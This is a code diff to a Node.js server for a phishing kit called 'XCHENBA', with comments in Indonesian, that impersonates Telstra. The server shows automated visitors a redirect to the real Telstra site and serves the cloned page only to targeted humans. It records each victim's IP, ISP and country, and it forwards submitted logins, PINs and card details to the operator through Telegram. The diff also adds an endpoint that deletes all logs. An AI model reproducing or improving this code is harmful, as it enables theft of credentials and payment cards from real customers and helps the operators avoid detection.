@@ -1,5 +1,5 @@
 // ==================================================
-// XCHENBA SERVER — HANYA DATA PENTING KE TELEGRAM
+// XCHENBA SERVER — LENGKAP SEMUA FITUR
 // DATABASE: mytelstra
 // ==================================================
 
@@ -21,7 +21,7 @@ const pool = new Pool({
 });
 
 // ==================================================
-// BUAT TABEL
+// BUAT TABEL JIKA BELUM ADA
 // ==================================================
 async function initDB() {
   try {
@@ -54,7 +54,7 @@ async function initDB() {
       );
     }
     
-    console.log('✅ Database siap — Hanya Login/PIN/Kartu ke Telegram');
+    console.log('✅ Database siap — Semua Fitur Aktif');
   } catch (err) {
     console.error('❌ DB Error:', err.message);
   }
@@ -135,6 +135,20 @@ app.post('/api/atur-parameter', async (req, res) => {
 });
 
 // ==================================================
+// API — RESET / HAPUS SEMUA LOG ✅
+// ==================================================
+app.post('/api/reset-log', async (req, res) => {
+  try {
+    await pool.query('DELETE FROM pengunjung');
+    await pool.query("ALTER SEQUENCE pengunjung_id_seq RESTART WITH 1");
+    res.json({ ok: true, pesan: 'Semua log berhasil dihapus' });
+  } catch (e) {
+    console.error('Reset error:', e);
+    res.status(500).json({ ok: false, pesan: e.message });
+  }
+});
+
+// ==================================================
 // API — AMBIL DATA PANEL
 // ==================================================
 app.get('/api/data', async (req, res) => {
@@ -157,7 +171,7 @@ app.get('/api/data', async (req, res) => {
 });
 
 // ==================================================
-// API — SIMPAN DATA ✅ HANYA LOGIN/PIN/KARTU KE TELEGRAM
+// API — SIMPAN DATA (HANYA LOGIN/PIN/KARTU KE TELEGRAM)
 // ==================================================
 app.post('/api/simpan', async (req, res) => {
   try {
@@ -172,7 +186,6 @@ app.post('/api/simpan', async (req, res) => {
       ['human', jenis, data, ip, infoIP.isp, infoIP.negara, req.headers['user-agent']]
     );
 
-    // ✅ HANYA KIRIM KE TELEGRAM JIKA SALAH SATU INI
     const kirimKeTelegram = ['login', 'pin', 'kartu'].includes(jenis);
     if (kirimKeTelegram) {
       const pesan = `<b>:: XCHENBA — ${jenis.toUpperCase()} ::</b>\n${data}\n🌍 IP: ${ip}\n📍 ISP: ${infoIP.isp}\n🏳️ Negara: ${infoIP.negara}`;
@@ -187,7 +200,7 @@ app.post('/api/simpan', async (req, res) => {
 });
 
 // ==================================================
-// HALAMAN UTAMA — BOT TETAP TERCATAT TAPI TIDAK KE TELEGRAM ✅
+// HALAMAN UTAMA — CEK PARAMETER
 // ==================================================
 app.get('/', async (req, res) => {
   const ipPenuh = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Tidak diketahui';
@@ -196,13 +209,11 @@ app.get('/', async (req, res) => {
   const infoIP = await ambilInfoIP(ip);
 
   if (!isHuman) {
-    // ✅ Bot TETAP tersimpan di panel, TAPI TIDAK dikirim ke Telegram
     await pool.query(
       `INSERT INTO pengunjung (tipe, kategori, data, ip, isp, negara, user_agent)
        VALUES ($1, $2, $3, $4, $5, $6, $7)`,
       ['bot', 'kunjungan', 'Mengakses tanpa parameter', ip, infoIP.isp, infoIP.negara, req.headers['user-agent']]
     );
-    // ❌ Tidak ada kirimTelegram untuk bot
     return res.redirect('https://www.telstra.com.au/');
   }
 
@@ -211,12 +222,12 @@ app.get('/', async (req, res) => {
      VALUES ($1, $2, $3, $4, $5, $6, $7)`,
     ['human', 'kunjungan', 'Mengakses dengan parameter ✅', ip, infoIP.isp, infoIP.negara, req.headers['user-agent']]
   );
-  // Kunjungan pertama juga tidak dikirim ke Telegram — tidak mengganggu
+
   res.sendFile('index.html', { root: './public' });
 });
 
 // ==================================================
-// LINDUNGI HALAMAN LAIN — BOT TIDAK KE TELEGRAM ✅
+// LINDUNGI HALAMAN LAIN
 // ==================================================
 app.get('/:halaman', async (req, res, next) => {
   const nama = req.params.halaman;
@@ -229,8 +240,6 @@ app.get('/:halaman', async (req, res, next) => {
     const ipPenuh = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Tidak diketahui';
     const ip = ipPenuh.split(',')[0].trim();
     const infoIP = await ambilInfoIP(ip);
-    
-    // ✅ Tercatat di panel, TIDAK dikirim ke Telegram
     await pool.query(
       `INSERT INTO pengunjung (tipe, kategori, data, ip, isp, negara, user_agent)
        VALUES ($1, $2, $3, $4, $5, $6, $7)`,
@@ -251,5 +260,5 @@ app.use(express.static('public'));
 // ==================================================
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log('🚀 XCHENBA — Hanya Login/PIN/Kartu ke Telegram');
+  console.log('🚀 XCHENBA — Semua Fitur Aktif');
 });
